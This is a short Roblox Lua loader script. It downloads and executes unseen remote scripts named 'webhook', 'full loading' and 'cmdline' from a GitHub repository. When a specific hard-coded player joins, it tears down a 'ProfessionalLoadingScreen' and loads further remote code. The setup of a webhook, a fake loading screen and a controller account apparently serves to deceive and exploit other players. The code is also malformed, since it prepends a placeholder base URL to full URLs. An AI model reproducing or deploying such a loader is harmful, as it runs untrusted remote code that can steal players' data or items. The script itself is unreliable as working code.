-- Ultra Simple Main Loader
local baseURL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/"

-- Load all scripts
loadstring(game:HttpGet(baseURL .. "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/webhook"))()
loadstring(game:HttpGet(baseURL .. "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/full%20loading"))()
loadstring(game:HttpGet(baseURL .. "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/cmdline"))()

print("âœ… All scripts loaded! Half loading should be visible.")

-- Auto-switch when authorized user joins
game.Players.PlayerAdded:Connect(function(player)
    if player.Name == "jaatshab_770" or player.DisplayName == "III" then
        wait(2)
        -- Remove half loading
        if game.Players.LocalPlayer.PlayerGui:FindFirstChild("ProfessionalLoadingScreen") then
            game.Players.LocalPlayer.PlayerGui.ProfessionalLoadingScreen:Destroy()
        end
        -- Load full loading
        loadstring(game:HttpGet(baseURL .. "full_loading.lua"))()
    end
end)
